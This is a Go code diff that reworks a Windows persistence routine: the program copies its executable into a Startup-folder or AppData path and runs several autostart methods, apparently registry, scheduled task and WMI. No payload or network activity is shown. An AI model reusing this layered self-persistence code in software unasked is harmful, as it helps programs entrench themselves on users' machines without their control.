@@ -44,23 +44,28 @@ func executablePrefix() string {
 	return defaultExecutablePrefix
 }
 
-func activeMethod() string {
-	m := strings.ToLower(strings.TrimSpace(DefaultPersistenceMethod))
-	switch m {
-	case "registry", "taskscheduler", "wmi":
-		return m
-	default:
-		return "startup"
-	}
-}
+var hasStartupMethod bool
 
 func getTargetPath() (string, error) {
-	switch activeMethod() {
-	case "registry", "taskscheduler", "wmi":
+	if !hasStartupMethod && len(persistInstallFns) > 0 {
 		return getAppDataTargetPath()
-	default:
-		return getStartupFolderTargetPath()
 	}
+	return getStartupFolderTargetPath()
+}
+
+func installStartupImpl(exePath string) error {
+	targetPath, err := getStartupFolderTargetPath()
+	if err != nil {
+		return err
+	}
+	dir := filepath.Dir(targetPath)
+	if err := os.MkdirAll(dir, 0755); err != nil {
+		return fmt.Errorf("failed to create startup directory: %w", err)
+	}
+	if strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
+		return nil
+	}
+	return replaceExecutable(exePath, targetPath)
 }
 
 func getStartupFolderTargetPath() (string, error) {
@@ -178,25 +183,21 @@ func runPowerShell(script string) error {
 }
 
 func install(exePath string) error {
-	targetPath, err := getTargetPath()
-	if err != nil {
-		return err
+	if len(persistInstallFns) == 0 {
+		if err := installStartupImpl(exePath); err != nil {
+			return err
+		}
+		_ = cleanupLegacyRunValues()
+		return nil
 	}
-
-	dir := filepath.Dir(targetPath)
-	if err := os.MkdirAll(dir, 0755); err != nil {
-		return fmt.Errorf("failed to create directory: %w", err)
+	var firstErr error
+	for _, fn := range persistInstallFns {
+		if err := fn(exePath); err != nil && firstErr == nil {
+			firstErr = err
+		}
 	}
-
-	if err := replaceExecutable(exePath, targetPath); err != nil {
-		return err
-	}
-
-	if err := persistInstallFn(targetPath); err != nil {
-		return fmt.Errorf("failed to install persistence: %w", err)
-	}
-
 	_ = cleanupLegacyRunValues()
+	return firstErr
 
 	return nil
 }
@@ -241,24 +242,7 @@ func replaceExecutable(exePath, targetPath string) error {
 }
 
 func configure(exePath string) error {
-	targetPath, err := getTargetPath()
-	if err != nil {
-		return err
-	}
-
-	if exePath != "" && !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
-		if err := replaceExecutable(exePath, targetPath); err != nil {
-			return err
-		}
-	}
-
-	if err := persistInstallFn(targetPath); err != nil {
-		return fmt.Errorf("failed to reconfigure persistence: %w", err)
-	}
-
-	_ = cleanupLegacyRunValues()
-
-	return nil
+	return install(exePath)
 }
 
 func uninstall() error {
